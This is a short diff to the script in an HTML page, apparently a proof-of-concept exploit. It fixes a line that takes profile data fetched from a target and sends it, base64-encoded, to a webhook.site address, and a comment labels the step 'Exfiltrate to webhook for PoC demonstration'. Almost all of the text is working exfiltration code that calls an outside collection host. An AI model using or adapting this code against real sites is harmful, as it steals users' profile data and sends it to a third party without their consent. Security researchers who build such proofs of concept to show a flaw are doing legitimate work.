@@ -8,8 +8,8 @@
       })
       .then(response => response.text())
       .then(data => {
-        // Exfiltrate to your webhook for PoC demonstration
-        fetch("https://webhook.site/d5cb6119-e02e-4635-b237-80b1a0de70b6?profile="+this.responseText;
+        // Exfiltrate to webhook for PoC demonstration
+        fetch("https://webhook.site/d5cb6119-e02e-4635-b237-80b1a0de70b6?profile=" + encodeURIComponent(btoa(data)));
       });
     </script>
   </body>
